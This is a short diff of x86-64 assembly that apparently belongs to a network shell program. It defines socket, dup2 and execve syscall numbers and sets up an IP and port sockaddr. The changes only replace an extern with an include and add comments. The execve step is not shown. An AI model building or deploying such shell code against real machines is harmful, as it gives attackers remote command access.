@@ -1,6 +1,8 @@
 default rel
 global _start
 
+%include "./src/ip_to_bin.asm"
+
 %define AF_INET 2
 %define EXIT 60
 %define SOCKET 41
@@ -8,8 +10,6 @@ global _start
 %define DUP2 33
 %define SOCK_STREAM 1
 %define EXECVE 59
-
-extern ip_to_int
 
 section .text
 
@@ -19,10 +19,10 @@ _start:
     sub rsp, 16
 
     mov bx, PORT
-    xchg bh, bl
+    xchg bh, bl ; PORT in bx
 
     lea rdi, [IP_ADDR]
-    call ip_to_int
+    call ip_to_int ; IP in eax
 
     mov word  [rsp],   AF_INET
     mov word  [rsp+2], bx
